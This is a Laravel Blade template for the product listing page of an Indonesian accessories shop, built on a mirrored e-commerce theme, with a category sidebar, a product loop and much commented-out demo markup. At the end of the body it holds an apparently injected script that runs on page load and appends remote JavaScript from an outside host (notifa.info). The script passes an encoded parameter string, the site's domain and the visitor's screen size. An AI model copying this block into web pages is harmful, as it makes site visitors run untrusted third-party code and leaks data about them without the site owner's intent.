<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:02 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<!-- /Added by HTTrack -->

<head>
    <!-- SITE TITTLE -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Dunia Aksesoris</title>
    <!-- PLUGINS CSS STYLE -->
    <link href="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
    <link href="{{asset('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick.css')}}" media="screen">
    <link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">
    <!-- CUSTOM CSS -->
    <link href="{{asset('/bigbag/css/style.css')}}" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('/bigbag/css/default.css')}}" id="option_color">
    <!-- Icons -->
    <link rel="shortcut icon" href="{{asset('/img/head.png')}}">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js')}}"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js')}}"></script>
		<![endif]-->

    <div class="topBar">
        <form style="padding-left: 600px; padding-top: 6px;" action="{{route('search')}}" method="GET" class="hm-searchbox">
            <input type="text" placeholder="Cari Produk" type="text" name="search">
            <button class="li-btn" type="submit"><i class="fa fa-search"></i></button>
        </form>
    </div>
</head>

<body class="body-wrapper version1">
    <!-- Preloader -->
    <div id="preloader" class="smooth-loader-wrapper">
        <div class="preloader_container">
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
            <div class="block"></div>
        </div>
    </div>
    <div class="main-wrapper">
        <!-- HEADER -->
        <div class="header clearfix">
            <!-- TOPBAR -->
            <!-- <div class="topBar">
					<div class="container">
						<div class="row">
							<div class="col-md-6 d-none d-md-block">
								<ul class="list-inline">
									<li><a href="#"><i class="fa fa-twitter"></i></a></li>
									<li><a href="#"><i class="fa fa-facebook"></i></a></li>
									<li><a href="#"><i class="fa fa-dribbble"></i></a></li>
									<li><a href="#"><i class="fa fa-vimeo"></i></a></li>
									<li><a href="#"><i class="fa fa-tumblr"></i></a></li>
								</ul>
							</div>
							<div class="col-md-6 col-12">
								<ul class="list-inline float-right top-right">
									<li class="account-login"><span><a data-toggle="modal" href='.html'>Log in</a><small>or</small><a data-toggle="modal" href='#signup'>Create an account</a></span></li>
									<li class="searchBox">
										<a href="#"><i class="fa fa-search"></i></a>
										<ul class="dropdown-menu dropdown-menu-right">
											<li>
												<span class="input-group">
													<input type="text" class="form-control" placeholder="Search…" aria-describedby="basic-addon2">
													<button type="submit" class="input-group-addon">Submit</button>
												</span>
											</li>
										</ul>
									</li>
									<li class="dropdown cart-dropdown">
										<a href="javascript:void(0)" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-shopping-cart"></i>$0</a>
										<ul class="dropdown-menu dropdown-menu-right">
											<li>Item(s) in your cart</li>
											<li>
												<a href="single-product.html">
													<div class="media">
														<img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
														<div class="media-body">
															<h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
														</div>
													</div>
												</a>
											</li>
											<li>
												<a href="single-product.html">
													<div class="media">
														<img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
														<div class="media-body">
															<h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
														</div>
													</div>
												</a>
											</li>
											<li>
												<div class="btn-group" role="group" aria-label="...">
													<button type="button" class="btn btn-default" onclick="location.href='cart-page.html';">Shopping Cart</button>
													<button type="button" class="btn btn-default" onclick="location.href='checkout-step-1.html';">Checkout</button>
												</div>
											</li>
										</ul>
									</li>
								</ul>
							</div>
						</div>
					</div>
					</div> -->
            <!-- NAVBAR -->
            <!-- Collect the nav links, forms, and other content for toggling -->
            @include('partials.frontend.navbar')
            <!-- /.navbar-collapse -->
            <div class="version2">
                <div class="dropdown cart-dropdown">
                    <a href="javascript:void(0)" class="dropdown-toggle shop-cart" data-toggle="dropdown">
                        <i class="fa fa-shopping-cart"></i>
                        <span class="badge">3</span>
                    </a>
                    <ul class="dropdown-menu dropdown-menu-right">
                        <li>Item(s) in your cart</li>
                        <li>
                            <a href="single-product.html">
                                <div class="media">
                                    <img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
                                    <div class="media-body">
                                        <h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
                                    </div>
                                </div>
                            </a>
                        </li>
                        <li>
                            <a href="single-product.html">
                                <div class="media">
                                    <img class="media-left media-object" src="{{asset('/bigbag/img/home/cart-items/cart-item-01.jpg')}}" alt="cart-Image">
                                    <div class="media-body">
                                        <h5 class="media-heading">INCIDIDUNT UT <br><span>2 X $199</span></h5>
                                    </div>
                                </div>
                            </a>
                        </li>
                        <li>
                            <div class="btn-group" role="group" aria-label="...">
                                <button type="button" class="btn btn-default" onclick="location.href='cart-page.html';">Shopping Cart</button>
                                <button type="button" class="btn btn-default" onclick="location.href='checkout-step-1.html';">Checkout</button>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        </nav>
    </div>
    @include('partials.frontend.banner')
    <!-- LIGHT SECTION -->
    <!-- <section class="lightSection clearfix pageHeader">
			<div class="container">
				<div class="row">
					<div class="col-md-6">
						<div class="page-title">
							<h2>Sweater</h2>
						</div>
					</div>
					<div class="col-md-6">
						<ol class="breadcrumb float-right">
							<li>
								<a href="index-2.html">Home</a>
							</li>
							<li>
								<a href="#">shop</a>
							</li>
							<li class="active">Sweater</li>
						</ol>
					</div>
				</div>
			</div>
			</section> -->
    <!-- MAIN CONTENT SECTION -->
    <section class="mainContent clearfix productsContent">
        <div class="container">
            <div class="container">
                <div class="row">
                    <div class="col-lg-3 col-md-4 sideBar">
                        <div class="panel panel-default">
                            <div class="panel-heading">Kategori Produk</div>
                            <div class="panel-body">
                                <div class="collapse navbar-collapse navbar-ex1-collapse navbar-side-collapse">
                                    <ul class="nav navbar-nav side-nav">
                                        <li><a href="/product"><i class="fa fa-caret-right" aria-hidden="true"></i>All</a></li>
                                        @foreach($kategori as $data) @if(count($data->Barang)>0)
                                        <li><a href="/product/kategori/{{ $data->slug }}"><i class="fa fa-caret-right" aria-hidden="true"></i>{{$data->kategori}} <span>({{ $data->Barang->count(0) }})</span></a></li>
                                        @endif @endforeach
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <!-- <div class="panel panel-default priceRange">
							<div class="panel-heading">Filter by Price</div>
							<div class="panel-body clearfix">
								<div class="price-slider-inner">
									<span class="amount-wrapper">
										Price:
										<input type="text" id="price-amount-1" readonly>
										<strong>-</strong>
										<input type="text" id="price-amount-2" readonly>
									</span>
									<div id="price-range"></div>
								</div>
								<input class="btn-default" type="submit" value="Filter">
							</div>
							</div> -->
                        <!-- <div class="panel panel-default filterNormal">
							<div class="panel-heading">filter by Color</div>
							<div class="panel-body">
								<ul class="list-unstyled">
									<li><a href="#">Black<span>(15)</span></a></li>
									<li><a href="#">White<span>(10)</span></a></li>
									<li><a href="#">Red<span>(7)</span></a></li>
									<li><a href="#">Blue<span>(12)</span></a></li>
									<li><a href="#">Orange<span>(12)</span></a></li>
								</ul>
							</div>
							</div> -->
                        <!-- <div class="panel panel-default filterNormal">
							<div class="panel-heading">filter by Size</div>
							<div class="panel-body">
								<ul class="list-unstyled clearfix">
									<li><a href="#">Small<span>(15)</span></a></li>
									<li><a href="#">Medium<span>(10)</span></a></li>
									<li><a href="#">Large<span>(7)</span></a></li>
									<li><a href="#">Extra Large<span>(12)</span></a></li>
								</ul>
							</div>
							</div> -->
                    </div>
                    <div class="col-lg-9 col-md-8">
                        <!-- <div class="row filterArea">
							<div class="col-6">
								<select name="guiest_id1" id="guiest_id1" class="select-drop">
									<option value="0">Default sorting</option>
									<option value="1">Sort by popularity</option>
									<option value="2">Sort by rating</option>
									<option value="3">Sort by newness</option>
									<option value="3">Sort by price</option>
								</select>
							</div>
							<div class="col-6">
								<div class="btn-group float-right" role="group">
									<button type="button" class="btn btn-default active" onclick="window.location.href='product-grid-left-sidebar.html'"><i class="fa fa-th" aria-hidden="true"></i><span>Grid</span></button>
									<button type="button" class="btn btn-default" onclick="window.location.href='product-list-left-sidebar.html'"><i class="fa fa-th-list" aria-hidden="true"></i><span>List</span></button>
								</div>
							</div>
							</div> -->
                        <div class="row">
                            @if (count($barangs) > 0) @foreach($barangs as $data)
                            <div class="col-md-5 col-lg-3">
                                <div class="productBox">
                                    <div class="productImage clearfix">
                                        <img src="{{asset('/img/'.$data->foto.'')}}" alt="products-img">
                                        <div class="productMasking">
                                            <ul class="list-inline btn-group" role="group">
                                                <li><a class="btn viewBtn" href="/product/{{$data->slug}}"><i class="fa fa-eye">Lihat</i></a></li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="productCaption clearfix">
                                        <h5>{{$data->nama_barang}}</h5>
                                        <h3>Rp. {{number_format($data->harga,2,',','.')}}</h3>
                                        <br>
                                    </div>
                                </div>
                            </div>
                            @endforeach @else
                            <h3>
                                    <b>
                                        <i>
                                            <center>Mohon Maaf Produk Tidak Ada...Coba Cari Lagi :)</center>
                                        </i>
                                    </b>
                                </h3> @endif
                            <!-- <div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-02.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Dip Dyed Sweater</h5>
										</a>
										<h3>$249</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-03.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Scarf Ring Corner</h5>
										</a>
										<h3>$179</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-04.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Sun Buddies</h5>
										</a>
										<h3>$149</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-05.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Nike Sportswear</h5>
										</a>
										<h3>$199</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-06.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Dip Dyed Sweater</h5>
										</a>
										<h3>$249</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-07.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Scarf Ring Corner</h5>
										</a>
										<h3>$179</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-08.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Sun Buddies</h5>
										</a>
										<h3>$149</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-09.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Nike Sportswear</h5>
										</a>
										<h3>$199</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-10.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Dip Dyed Sweater</h5>
										</a>
										<h3>$249</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-11.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Scarf Ring Corner</h5>
										</a>
										<h3>$179</h3>
									</div>
								</div>
								</div>
								<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset('/bigbag/img/products/products-12.jpg')}}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
												<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
												<li><a class="btn btn-default" data-toggle="modal" href="-2.html" ><i class="fa fa-eye"></i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="single-product.html">
											<h5>Sun Buddies</h5>
										</a>
										<h3>$149</h3>
									</div>
								</div>
								</div> -->
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-4"></div>
                    <div class="col-md-3"></div>
                    <div class="col-md-2">
                        {{$barangs->links()}}</div>
                    <div class="col-md-3">
                    </div>
                </div>
            </div>
    </section>
    <!-- LIGHT SECTION -->
    <!-- <section class="lightSection clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div class=" partnersLogoSlider">
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-01.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-02.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-03.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-04.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-05.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-01.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-02.png')}}" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="{{asset('/bigbag/img/home/partners/partner-03.png')}}" alt="partner-img">
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			</section> -->
    <!-- FOOTER -->
    @include('partials.frontend.footer')
    <!-- COPY RIGHT -->
    @include('partials.frontend.copyright')
    <!-- SIGN UP MODAL -->
    <div class="modal fade " id="signup" tabindex="-1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header justify-content-center">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                    <h3 class="modal-title">Create an account</h3>
                </div>
                <div class="modal-body">
                    <form action="#" method="POST" role="form">
                        <div class="form-group">
                            <label for="">Enter Email</label>
                            <input type="email" class="form-control" id="">
                        </div>
                        <div class="form-group">
                            <label for="">Password</label>
                            <input type="password" class="form-control" id="">
                        </div>
                        <div class="form-group">
                            <label for="">Confirm Password</label>
                            <input type="password" class="form-control" id="">
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">Sign up</button>
                        <button type="button" class="btn btn-link btn-block">New User?</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <!-- PORDUCT QUICK VIEW MODAL -->
    <div class="modal fade quick-view" tabindex="-1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                    <div class="media flex-wrap">
                        <div class="media-left px-0">
                            <img class="media-object" src="{{asset('/bigbag/img/products/quick-view/quick-view-01.jpg')}}" alt="Image">
                        </div>
                        <div class="media-body">
                            <h2>Old Skool Navy</h2>
                            <h3>$149</h3>
                            <p>Classic sneaker from Vans. Cotton canvas and suede upper. Textile lining with heel stabilizer and ankle support. Contrasting laces. Sits on a classic waffle rubber sole.</p>
                            <span class="quick-drop">
									<select name="guiest_id3" id="guiest_id3" class="select-drop">
										<option value="0">Size</option>
										<option value="1">Size 1</option>
										<option value="2">Size 2</option>
										<option value="3">Size 3</option>
									</select>
								</span>
                            <span class="quick-drop resizeWidth">
									<select name="guiest_id4" id="guiest_id4" class="select-drop">
										<option value="0">Qty</option>
										<option value="1">Qty 1</option>
										<option value="2">Qty 2</option>
										<option value="3">Qty 3</option>
									</select>
								</span>
                            <div class="btn-area">
                                <a href="#" class="btn btn-primary btn-block">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="{{asset('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/slick/slick.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/prismjs/prism.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
    <script src="{{asset('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
    <script src="{{asset('/bigbag/js/custom.js')}}"></script>
    <!-- <link href="{{asset('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
			<script src="{{asset('/bigbag/options/optionswitcher.js')}}"></script> -->
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bH3J3OHAMXVqyOhrXr1Zr8QymYewayZcL9CWBK1c18IGmy7CoGLrcFWztkJifapX9tvb6upSFDqI%2booaiJwIisuWDoCTGjxcdkQ8irIRV%2fcwuQ44RLI%2bXRhCWw%2bamSlYNK4nepTt%2bTP%2bol0W9%2bVaunRqHFWWJQOOlVCvEZhtGkhpTqSPqTwn80Tp2wFyUkT0tZ5xFbQDX3H%2biktN5JEpbo6DQ7g1EezmfRO7msbmenrjxcuMr%2bF0WmHyGaFDIzvOwW4whQt2uXB6hiefnts14En%2b2yGZ%2bUX34ZkBD%2bOtA1PZqSirqKG%2fWldUdweIuSQIJQyHAI1i9tZImUMZWCvVLrh0sKF4y1I91vYHaJMho4nyWsir8pSi3LiYo8oh009O7usnt2ryggvj3%2fihxiFcrgCcbUL5%2foF6eXSbH%2bhCepKnm%2f%2b%2bzgl5B6beF8wOQ9ZsF76s6nPRv1TMiHbabQ%2f2rNR6Gcm9MxWk3yWV5Sl5DYKFu%2bXUKyUYoKmE6Lbhp2XZBk%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>
<!-- Mirrored from themes.iamabdus.com/bigbag/2.1/product-grid-left-sidebar.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Sep 2018 11:03:27 GMT -->

</html>